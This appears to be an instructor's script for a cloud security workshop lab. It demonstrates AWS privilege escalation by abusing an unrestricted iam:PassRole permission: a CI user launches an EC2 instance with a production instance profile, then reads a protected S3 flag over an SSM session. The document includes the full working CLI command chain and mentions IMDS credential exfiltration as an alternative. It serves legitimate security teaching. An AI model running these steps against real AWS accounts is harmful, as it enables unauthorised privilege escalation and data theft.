# Scenario 3 — Attack bullets (morning, ~15 min)

Source: Lab 1 Exercise 5. Identity: `iamws-ci-runner-user`. Target: crown jewels via launching EC2 with `iamws-prod-deploy-profile` (missing `iam:PassedToService` condition).

## Pre-attack — recon with iam-recon

- `iam-recon --account $ACCOUNT_ID argquery --preset privesc` → shows EC2 PassRole edge to `iamws-prod-deploy-role`.
- `iam-recon --account $ACCOUNT_ID argquery --principal user/iamws-ci-runner-user --action iam:PassRole` → ALLOW line confirms unrestricted PassRole.
- `iam-recon --account $ACCOUNT_ID pathfinding` → also surfaces `[ec2-001]` (New PassRole).
- Examine the policy: notice `iam:PassRole` has `Resource: *` and **no** `iam:PassedToService` condition.

## Exploit — full command path

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-ci-runner-user)

# Step 1: try the crown jewels → DENIED
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-ci-runner-user
# expect: Forbidden

# Step 2: inspect the vulnerable policy
# NOTE: iamws-ci-runner-user does NOT have iam:GetPolicyVersion — this command fails as the
#       attacker user (AccessDeniedException). The policy contents are shown in the slide; if a
#       participant wants to verify, they can run this against the admin profile (e.g. taractf).
aws iam get-policy-version \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy \
  --version-id v1 --query 'PolicyVersion.Document' --output json \
  --profile taractf
# note: PassRole has Resource:* and NO Condition block

# Step 3: find an AMI + subnet
AMI_ID=$(aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text \
  --profile iamws-ci-runner-user)

SUBNET_ID=$(aws ec2 describe-subnets \
  --filters "Name=default-for-az,Values=true" \
  --query 'Subnets[0].SubnetId' --output text \
  --profile iamws-ci-runner-user)

# Step 4: launch EC2 with the privileged instance profile
INSTANCE_ID=$(aws ec2 run-instances \
  --image-id $AMI_ID --instance-type t2.micro \
  --iam-instance-profile Name=iamws-prod-deploy-profile \
  --subnet-id $SUBNET_ID \
  --query 'Instances[0].InstanceId' --output text \
  --profile iamws-ci-runner-user)
echo "Launched: $INSTANCE_ID"

# Step 5: wait ~90s for the SSM agent to register
# NOTE: iamws-ci-runner-user lacks ssm:DescribeInstanceInformation, so polling for "Online"
#       as the attacker fails. Either sleep 90s blindly, or poll under taractf.
sleep 90
aws ssm describe-instance-information \
  --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
  --query 'InstanceInformationList[0].PingStatus' --output text \
  --profile taractf
# expect: Online

# Step 6: SSM session into the instance, claim crown jewels
# This step is INTERACTIVE — `aws ssm start-session` opens a tty. Run it from a real terminal,
# not from a non-interactive shell / CI runner. Validation harnesses should use
# `aws ssm send-command` as taractf instead (see cleanup.md).
aws ssm start-session --target $INSTANCE_ID \
  --profile iamws-ci-runner-user

# Inside the session:
aws sts get-caller-identity                          # shows iamws-prod-deploy-role
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
exit
```

## Demo bullets

- In iam-recon's interactive viz, click the EC2 edge — show that it's flagged because PassRole has no service condition.
- Mention IMDS exfil as the "real-world" alternative to SSM (instructor's call whether to demo).
- Cleanup: terminate the instance after the demo — `aws ec2 terminate-instances --instance-ids $INSTANCE_ID --profile iamws-ci-runner-user`.
